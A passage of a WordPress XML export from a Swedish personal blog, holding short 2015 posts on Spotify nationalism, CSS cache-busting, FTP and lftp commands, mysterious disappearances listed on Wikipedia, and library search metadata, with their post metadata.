		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>engelskaord</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="engelska"><![CDATA[engelska]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[169]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[169]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Spotifynationalismen</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/09/spotifynationalismen/</link>
		<pubDate>Sat, 09 May 2015 05:08:21 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=180</guid>
		<description></description>
		<content:encoded><![CDATA[I Sverige rapporteras det om företaget som om det handlade om sport. Som att Spotify vore Sveriges lag, och spelar mot iTunes och Youtube, å att vi, svenskarna, måste hejja på Spotify.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>180</wp:post_id>
		<wp:post_date>2015-05-09 05:08:21</wp:post_date>
		<wp:post_date_gmt>2015-05-09 05:08:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>spotifynationalismen</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[180]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[180]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Skriva kod i wordpress-post</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/11/skriva-kod-i-wordpress-post/</link>
		<pubDate>Mon, 11 May 2015 18:24:32 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=195</guid>
		<description></description>
		<content:encoded><![CDATA[Det är knöligt att skriva ut kod i wordpress-bloggar.
Det bästa sättet att göra det är att lägga till följande tag.

[ code language="html"]
html-kod
[ /code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>195</wp:post_id>
		<wp:post_date>2015-05-11 18:24:32</wp:post_date>
		<wp:post_date_gmt>2015-05-11 18:24:32</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>skriva-kod-i-wordpress-post</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[195]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[195]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Långsam uppdatering av CSS</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/14/langsam-uppdatering-av-css/</link>
		<pubDate>Tue, 14 Apr 2015 21:10:29 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=88</guid>
		<description></description>
		<content:encoded><![CDATA[Ibland sker det att uppdateringen av style.css går väldigt långsamt. Det kan ta flera minuter innan ändringar visas på sidan. Det är irriterande eftersom man vill se effekterna av en ändring omedelbart. Jag tror att det beror på att servern har cachat sidan. Felet verkar inte ligga i browsern.

Jag har löst problemet genom att lägga till
<pre>?t=[timestamp]</pre>
i header.php här:
<pre>&lt;link rel="stylesheet" href="&lt;?php bloginfo("stylesheet_url"); ?&gt;<strong>?t=[timestamp]</strong>" type="text/css"&gt;</pre>
Ett annat sätt att lösa problemet är att lägga in
<pre> ?&lt;?php echo time(); ?&gt;</pre>
på samma ställa.

Det ska sägas att detta inte är en långsiktig lösning. Så ta bort den delen när sidan ska gå live.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1633</wp:post_id>
		<wp:post_date>2015-04-14 21:10:29</wp:post_date>
		<wp:post_date_gmt>2015-04-14 21:10:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>langsam-uppdatering-av-css</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="webbdesign"><![CDATA[webbdesign]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[88]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[88]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Om datamaskinen</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/15/om-datamaskinen/</link>
		<pubDate>Wed, 15 Apr 2015 17:13:52 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=93</guid>
		<description></description>
		<content:encoded><![CDATA[Algoritmer finns överallt. Allt från matlagning, till sophämtning, till byråkrati. Vi kan ta exemplet byråkrati. Algoritmen som styr den byråkratiska processen är för det mesta skriven i olika protokoll, guidelines, regler och lagar. Men implementeringen av algoritmen utförs av människor. Det enda som egentligen skiljer en dator och en byråkrati åt är strömmen, elen. Datorn drivs av elektricitet, medan byråkratin drivs av människor.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1634</wp:post_id>
		<wp:post_date>2015-04-15 17:13:52</wp:post_date>
		<wp:post_date_gmt>2015-04-15 17:13:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>om-datamaskinen</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="algoritm"><![CDATA[algoritm]]></category>
		<category domain="category" nicename="allmant"><![CDATA[allmänt]]></category>
		<category domain="post_tag" nicename="byrakrati"><![CDATA[byråkrati]]></category>
		<category domain="post_tag" nicename="datormaskin"><![CDATA[datormaskin]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[93]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[93]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Den bästa wikipediasidan</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/17/den-basta-wikipediasidan/</link>
		<pubDate>Fri, 17 Apr 2015 16:14:36 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=95</guid>
		<description></description>
		<content:encoded><![CDATA[Den bästa wikipediasidan som skrivits är: <a href="https://en.wikipedia.org/wiki/List_of_people_who_disappeared_mysteriously">List of people who disappeared mysteriously</a>. Förr i tiden kunde en människa bara försvinna, för att sedan dyka upp som en ny person, med en ny identitet. Det var antagligen inte speciellt svårt. Muta nån byråkrat i nån avlägsen håla för att få nya papper med en ny identitet. Människan kunde återuppfinna sig själv när det väl hade gått åt pipsvängen. Man kunde börja om på nytt. Idag går inte det. Idag är vi fångade i vår egen historia, den kan vi inte undvika.

Några mystiska highlights:

&nbsp;
<ul>
	<li>1826 – <a title="William Morgan (anti-Mason)" href="https://en.wikipedia.org/wiki/William_Morgan_%28anti-Mason%29">William Morgan</a> (52), resident of <a class="mw-redirect" title="Batavia (city), New York" href="https://en.wikipedia.org/wiki/Batavia_%28city%29,_New_York">Batavia, New York</a>, disappeared just before his book critical of <a title="Freemasonry" href="https://en.wikipedia.org/wiki/Freemasonry">Freemasonry</a> was published.</li>
	<li>1848 – <a title="Khachatur Abovian" href="https://en.wikipedia.org/wiki/Khachatur_Abovian">Khachatur Abovian</a> (38), an Armenian writer and national public figure of the early 19th century, credited as creator of modern <a title="Armenian literature" href="https://en.wikipedia.org/wiki/Armenian_literature">Armenian literature</a>, left his house early one morning and was never heard from again.</li>
	<li>1918 – <a title="Arthur Cravan" href="https://en.wikipedia.org/wiki/Arthur_Cravan">Arthur Cravan</a> (31), French proto-<a title="Dada" href="https://en.wikipedia.org/wiki/Dada">dadaist</a> writer and art critic, disappeared near <a title="Salina Cruz" href="https://en.wikipedia.org/wiki/Salina_Cruz">Salina Cruz</a>, Mexico; he most likely drowned.</li>
	<li>1934 – <a title="Wallace Fard Muhammad" href="https://en.wikipedia.org/wiki/Wallace_Fard_Muhammad">Wallace Fard Muhammad</a> (43), founder of the <a title="Nation of Islam" href="https://en.wikipedia.org/wiki/Nation_of_Islam">Nation of Islam</a>, left <a title="Detroit" href="https://en.wikipedia.org/wiki/Detroit">Detroit</a> and was never heard from again.</li>
	<li>1939 – <a title="Barbara Newhall Follett" href="https://en.wikipedia.org/wiki/Barbara_Newhall_Follett">Barbara Newhall Follett</a> (25) was an American child prodigy novelist. Her first novel, <i>The House Without Windows</i>, was published in 1927 when she was thirteen years old. Her next novel, <i>The Voyage of the Norman D.</i>, received critical acclaim when she was fourteen. In 1939, aged 25, she became depressed with her marriage and walked out of her apartment with just thirty dollars. She was never seen again.</li>
</ul>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1635</wp:post_id>
		<wp:post_date>2015-04-17 16:14:36</wp:post_date>
		<wp:post_date_gmt>2015-04-17 16:14:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>den-basta-wikipediasidan</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="allmant"><![CDATA[allmänt]]></category>
		<category domain="post_tag" nicename="kuriosa"><![CDATA[kuriosa]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[95]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[95]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>FTP-kommandon</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/17/ftp-kommandon/</link>
		<pubDate>Fri, 17 Apr 2015 17:53:54 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=97</guid>
		<description></description>
		<content:encoded><![CDATA[Lista på FTP-kommandon att känna till. <a href="http://www.computerhope.com/issues/ch001246.htm">Här finns fler kommandon.</a>

<strong>cd</strong>, <strong>ls -la</strong> , <strong>pwd</strong> och andra vanliga *nix-kommandon fungerar.

<strong>get</strong> - För att hämta filer från remote-dator. Ex. <strong>get fil1</strong>

<strong>put</strong> - För att skicka fil till remote-dator: <strong>put fil1</strong>

<strong>mget</strong> - För hämta flertal filer. Ex. <strong>mget fil1 fil2 fil3</strong>. För att snabbt ta hem filer är det smart att först inaktivera prompt-läget genom kommandot: <strong>prompt</strong>. Och sedan köra kommandot <strong>mget *</strong>. Då laddas alla filer i mappen ner automatiskt.

<strong>mput</strong> - För att ladda upp flertal filer. Ex. <strong>mput fil1 fil2 fil3</strong>. <strong>mput *</strong> fungerar här också. Glöm inte att inaktivera prompten innan.

<strong>mkdir</strong> - skapa en mapp

<strong>rmdir</strong> - ta bort mapp

<strong>del</strong> - för att ta bort fil ex. <strong>del fil1</strong>

<strong>mdel</strong> - ta bort flera filer. Ex. <strong>mdel fil1 fil2 fil3</strong>

<strong>prompt</strong> - för att inte bli för förfrågad för varje fil som du vill ta bort, ladda upp, ladda ner. Ex: <strong>prompt</strong> [enter] <strong>mdel fil1 fil2 fil3</strong>.

<h2>Radera rekurisvt </h2>
För att ta bort alla filer i en mapp och alla filer som finns i den mappen så behöver man ladda ner lftp. Ftp verkar inte kunna göra det.
Så för att ladda ner lftp behöver du homebrew om du har mac. Om du har homebrew så kan du först köra:
[code language="bash"]
brew doctor
brew update
brew install lftp
[/code]
När lftp är nerladdat och installerat så loggar du in på följande sätt:
[code language="bash"]
lftp
open -u user,password -p 21 adress
[/code]

<strong>Exempel</strong>
[code language="bash"]
lftp
open -u mittanvändarnamn,losenord -p 21 189.76.177.13
[/code]

Sedan kan du använda kommandot: <strong>rm -r mappnamn</strong> för att rekursivt.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1636</wp:post_id>
		<wp:post_date>2015-04-17 17:53:54</wp:post_date>
		<wp:post_date_gmt>2015-04-17 17:53:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ftp-kommandon</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ftp"><![CDATA[ftp]]></category>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11134648407]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[97]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[97]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Jerker Dalman och arbetsetiken</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/20/jerker-dalman-och-arbetsetiken/</link>
		<pubDate>Mon, 20 Apr 2015 19:36:07 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=109</guid>
		<description></description>
		<content:encoded><![CDATA[Jag minns att jag, liksom många andra, blev djupt provocerad av Jerker Dalman i första säsongen av Expedition Robinson. Han blev känd för att bara ligga och slappa i hängmattan. Men i slutändan var det ändå han som vann. Jerker hade rätt hela tiden, varför bygga och göra saker på en öde ö, när man vet att man kan skickas hem när som helst. Eller i alla fall efter ö-råden. Den mest rimliga approachen till livet på den öde ön i Expedition Robinson är såklart att äta tillräckligt, för att slippa vara hungrig. Och sedan bara bada, slappa och ha det roligt.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1637</wp:post_id>
		<wp:post_date>2015-04-20 19:36:07</wp:post_date>
		<wp:post_date_gmt>2015-04-20 19:36:07</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>jerker-dalman-och-arbetsetiken</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="robotkommunism"><![CDATA[robotkommunism]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[109]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[109]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Vilka företag skickar svenska bibliotek information till</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/22/vilka-foretag-skickar-svenska-bibliotek-information-till/</link>
		<pubDate>Wed, 22 Apr 2015 20:39:57 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=121</guid>
		<description></description>
		<content:encoded><![CDATA[Varje gång vi gör en sökning på ett biblioteks databas, eller en tidskriftdatabas så sparas metadata. Ibland skickas denna metadata till olika företag.

Se dessa <a href="http://go-to-hellman.blogspot.com/2015/03/16-of-top-20-research-journals-let-ad.html">två</a> <a href="http://copyriot.se/2012/10/21/sokningar-pa-biblioteket-loggas-av-foretagskoncern/">artiklar</a>.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1638</wp:post_id>
		<wp:post_date>2015-04-22 20:39:57</wp:post_date>
		<wp:post_date_gmt>2015-04-22 20:39:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vilka-foretag-skickar-svenska-bibliotek-information-till</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="artikelide"><![CDATA[artikelidé]]></category>
		<category domain="category" nicename="integritet"><![CDATA[integritet]]></category>
		<category domain="category" nicename="tidskrift"><![CDATA[tidskrift]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[121]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[121]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>cropped-img_01531.jpg</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/cropped-img_01531-jpg/</link>
		<pubDate>Mon, 11 May 2015 18:58:27 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.files.wordpress.com/2015/05/cropped-img_01531.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[http://narcotize.files.wordpress.com/2015/03/cropped-img_01531.jpg]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1677</wp:post_id>
		<wp:post_date>2015-05-11 18:58:27</wp:post_date>
		<wp:post_date_gmt>2015-05-11 18:58:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cropped-img_01531-jpg</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>https://stuffidontwanttogoogleagain.files.wordpress.com/2015/05/cropped-img_01531.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/05/cropped-img_01531.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";i:954;s:6:"height";i:1300;s:4:"file";s:94:"/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/05/cropped-img_01531.jpg";s:5:"sizes";a:0:{}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[201]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_context</wp:meta_key>
			<wp:meta_value><![CDATA[custom-header]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_custom_header_last_used_pub/coherent</wp:meta_key>
			<wp:meta_value><![CDATA[1431370708]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_is_custom_header</wp:meta_key>
			<wp:meta_value><![CDATA[pub/coherent]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_original_import_url</wp:meta_key>
			<wp:meta_value><![CDATA[https://narcotize.files.wordpress.com/2015/03/cropped-img_01531.jpg]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Robotkommunism</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/15/robotkommunism/</link>
		<pubDate>Fri, 15 May 2015 14:45:36 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=228</guid>
		<description></description>
